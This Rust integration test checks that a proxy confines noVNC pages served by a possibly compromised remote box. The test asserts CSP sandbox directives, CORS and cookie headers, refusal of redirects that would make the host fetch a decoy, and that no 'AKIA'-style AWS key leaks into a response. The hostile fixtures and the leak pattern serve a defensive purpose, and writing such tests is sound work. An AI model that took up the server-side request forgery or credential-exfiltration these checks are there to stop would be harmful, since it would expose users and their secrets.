    // A box that was taken over serves script. It still arrives — noVNC is script, and the
    // proxy cannot tell the two apart — but as a page in an opaque origin, which neither sends
    // this origin's Lax cookies nor reads its answers.
    let hostile = h
        .client
        .get(format!("{ticket_path}/hostile.html"))
        .send()
        .await
        .expect("hostile");
    assert_eq!(hostile.status().as_u16(), 200);
    let headers = hostile.headers().clone();
    let header = |name: &str| {
        headers
            .get(name)
            .and_then(|value| value.to_str().ok())
            .unwrap_or_default()
            .to_string()
    };
    let csp = header("content-security-policy");
    assert!(
        csp.split(';').any(|directive| {
            let mut tokens = directive.split_whitespace();
            tokens.next() == Some("sandbox") && tokens.any(|token| token == "allow-scripts")
        }),
        "the box's page must be sandboxed with its scripts allowed: {csp:?}"
    );
    for escape in [
        "allow-same-origin",
        "allow-top-navigation",
        "allow-popups",
        "allow-forms",
    ] {
        assert!(
            !csp.contains(escape),
            "{escape} undoes the sandbox: {csp:?}"
        );
    }
    assert_eq!(header("x-content-type-options"), "nosniff");
    assert_eq!(
        header("access-control-allow-origin"),
        "*",
        "noVNC's modules load by CORS from the opaque origin"
    );
    assert!(
        header("access-control-allow-credentials").is_empty(),
        "an opaque origin must never be handed a credentialed read"
    );
    assert_eq!(header("referrer-policy"), "no-referrer");
    assert!(
        header("set-cookie").is_empty(),
        "nothing the box says reaches a cookie"
    );
    assert_eq!(header("content-type"), "text/html");
    let body = hostile.text().await.expect("body");
    assert!(body.ends_with(HOSTILE), "{body}");

    // noVNC's own files carry the same confinement: the sandbox is on the path, not on a guess
    // about which files are pages.
    let script = h
        .client
        .get(format!("{ticket_path}/app/ui.js"))
        .send()
        .await
        .expect("script");
    assert_eq!(script.status().as_u16(), 200);
    assert_eq!(
        script
            .headers()
            .get("access-control-allow-origin")
            .and_then(|value| value.to_str().ok()),
        Some("*")
    );

    // A redirect is the box asking this host to fetch something for it. It is refused, and
    // the decoy it named is never dialled.
    let (status, body) = h.open(&format!("{ticket_path}/moved.html")).await;
    assert_eq!(status, 502, "{body}");
    assert!(body.contains("redirect"), "the refusal says why: {body}");
    assert!(!body.contains("AKIA"), "{body}");
    assert!(
        h.box_saw
            .lock()
            .expect("saw")
            .iter()
            .any(|line| line.starts_with("GET /moved.html ")),
        "the box was asked for the page"
    );
    assert_eq!(
        h.decoy_hits.load(Ordering::SeqCst),
        0,
        "the redirect's target must never be fetched"
    );
}
